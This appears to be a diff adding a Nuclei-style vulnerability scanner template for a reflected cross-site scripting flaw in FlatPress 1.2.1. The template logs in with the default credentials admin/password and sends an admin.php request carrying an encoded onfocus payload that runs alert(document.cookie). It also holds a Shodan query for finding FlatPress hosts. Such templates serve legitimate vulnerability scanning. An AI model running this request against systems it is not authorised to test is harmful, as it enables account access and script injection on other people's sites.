@@ -1,0 +1,53 @@
+id: flatpress-xss
+
+info:
+  name: FlatPress 1.2.1 - Cross-site scripting (XSS)
+  author: arafatansari
+  severity: medium
+  description: |
+    A Reflected cross-site scripting (XSS) vulnerability exists in FlatPress 1.2.1 that allows for arbitrary execution of JavaScript commands through blog content.
+  reference:
+    - https://github.com/flatpressblog/flatpress/issues/153
+  metadata:
+    shodan-query: http.html:"Flatpress"
+    verified: "true"
+  tags: xss,cve,2021
+
+requests:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykGJmx9vKsePrMkVp
+
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp
+        Content-Disposition: form-data; name="user"
+
+        admin
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp
+        Content-Disposition: form-data; name="pass"
+
+        password
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp
+        Content-Disposition: form-data; name="submit"
+
+        Login
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp--
+      
+      - |
+        GET /admin.php?p=static&action=write&page=%22onfocus%3d%22alert%28document.cookie%29%22autofocus%3d%22 HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert(document.cookie)"
+        condition: and  
